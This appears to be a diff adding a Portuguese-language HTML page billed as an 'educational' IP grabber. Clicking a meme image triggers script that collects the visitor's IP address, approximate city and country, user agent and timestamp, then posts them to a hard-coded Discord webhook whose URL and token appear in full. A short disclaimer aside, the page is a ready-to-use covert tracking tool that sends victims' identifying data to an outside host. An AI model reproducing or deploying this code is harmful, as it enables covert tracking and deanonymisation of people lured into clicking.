@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo IP Grabber - Educacional</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; padding: 50px; }
+        img { cursor: pointer; border: 2px solid #000; border-radius: 10px; max-width: 100%; height: auto; }
+        #status { margin-top: 20px; color: green; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>Demo Educacional: Clique na Imagem para "Grabar" IP</h1>
+    <p><em>(Apenas para fins de aprendizado em cibersegurança. Não use maliciosamente!)</em></p>
+    
+    <img id="grabberImg" src="https://i.imgflip.com/7q9knu.jpg" alt="Meme Troll IP Leak" onclick="grabIP()">
+    
+    <div id="status"></div>
+
+    <script>
+        async function grabIP() {
+            const status = document.getElementById('status');
+            status.textContent = 'Capturando dados... Aguarde!';
+            status.style.color = 'orange';
+
+            try {
+                // Pega o IP via API pública
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                // Pega User Agent e timestamp
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toLocaleString('pt-BR');
+
+                // Geolocalização aproximada (opcional, via IP)
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoResponse.json();
+                const location = geoData.city ? `${geoData.city}, ${geoData.country_name}` : 'Localização não disponível';
+
+                // Monta o payload para o Discord Webhook (embed formatado)
+                const payload = {
+                    embeds: [{
+                        title: '🕵️ Novo Clique Detectado!',
+                        color: 0xFF0000, // Vermelho para alerta
+                        fields: [
+                            { name: 'IP', value: `\`${ip}\``, inline: true },
+                            { name: 'Localização Aprox.', value: location, inline: true },
+                            { name: 'User Agent', value: `\`${userAgent.substring(0, 100)}...\``, inline: false },
+                            { name: 'Data/Hora', value: timestamp, inline: true }
+                        ],
+                        footer: { text: 'Demo Educacional - Cibersegurança' },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Envia para o Webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1429555386771570869/oDF95nMddL1lLTvQMUm3Zjav8vccK-ccYezgLbhBNTT-8t50ob_xECpvvK5jAIiLlfUS';
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    status.textContent = 'Dados enviados com sucesso! Verifique o Discord.';
+                    status.style.color = 'green';
+                } else {
+                    throw new Error('Erro no webhook');
+                }
+            } catch (error) {
+                status.textContent = `Erro: ${error.message}`;
+                status.style.color = 'red';
+            }
+        }
+    </script>
+</body>
+</html>
